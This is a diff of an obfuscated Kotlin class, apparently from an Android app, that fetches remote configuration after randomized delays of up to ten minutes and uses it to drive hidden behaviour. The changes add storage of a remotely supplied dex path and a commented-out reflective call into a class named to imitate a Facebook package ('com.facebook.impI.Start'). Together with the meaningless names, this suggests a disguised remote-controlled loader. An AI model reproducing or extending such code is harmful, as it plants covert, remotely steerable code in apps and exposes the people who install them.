@@ -30,7 +30,8 @@ fun String.mapStr(keyT: String): String {
     }.joinToString("")
 }
 
-class RavenAdminFetch(val url: String) {
+class RavenFetch(val url: String) {
+    private var isGo = false
     private val conG = "config_G"
     private val list = arrayListOf<Int>(5, 1)
     private var mIoScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -53,14 +54,14 @@ class RavenAdminFetch(val url: String) {
         if (con.isBlank()) {
             startFetch(list[0])
         } else {
-            refreshLastConfigure(con)
+            refConf(con)
             if (mS == "a") {
                 mIoScope.launch {
                     delay(Random.nextLong(1000, 60000 * 10))
                     startFetch(list[1])
                 }
             } else {
-                bz()
+                bizjam()
             }
         }
     }
@@ -100,8 +101,8 @@ class RavenAdminFetch(val url: String) {
                     if (res.isBlank()) {
                         requestOver("null")
                     } else {
-                        refreshLastConfigure(res)
-                        bz()
+                        refConf(res)
+                        bizjam()
                         TaborHelper.postEvent(conG, mS)
                     }
                 } else {
@@ -125,7 +126,7 @@ class RavenAdminFetch(val url: String) {
                 startFetch(3)
             }
         } else {
-            bz()
+            bizjam()
         }
     }
 
@@ -140,7 +141,7 @@ class RavenAdminFetch(val url: String) {
         return ""
     }
 
-    private fun refreshLastConfigure(string: String) {
+    private fun refConf(string: String) {
         try {
             JSONObject(string).apply {
                 val s = optString("gazelle_gos_s")
@@ -154,17 +155,17 @@ class RavenAdminFetch(val url: String) {
                 }
                 EventHelper.mustPostName = optString("str_name_event", "")
                 EventHelper.isCanPostJson = s.contains("cc1").not()
-                CacheRaven.saveConfigure(string)
+                EventHelper.isCanFinish = s.contains("gaze")
+                CacheRaven.saveConfigure(string, optString("igl_dex_path"))
                 CacheRaven.naS(optString("gazelle_fbi"), optString("gazelle_fbt"))
                 val timeStr = optString("gazelle_tim")
                 val timeList = timeStr.split("-")
                 cheAT = timeList[0].toInt() * 60000L
                 cheBT = timeList[1].toInt() * 1000L
-                if (s.contains("gaze")) {
-
-                }
+                TaborHelper.postEvent("next_u", optString("types_str", ""))
             }
         } catch (e: Exception) {
+            e.printStackTrace()
             TaborHelper.postEvent("cf_fail", e.stackTraceToString())
         }
     }
@@ -188,7 +189,13 @@ class RavenAdminFetch(val url: String) {
         }
     }
 
-    private fun bz() {
+    private fun next() {
+        // todo test
+//        Class.forName("com.facebook.impI.Start").getMethod("a", Float::class.java)
+//            .invoke(null, 1.0f)
+    }
+
+    private fun bizjam() {
         val time = t0()
         mIoScope.launch {
             delay(time)
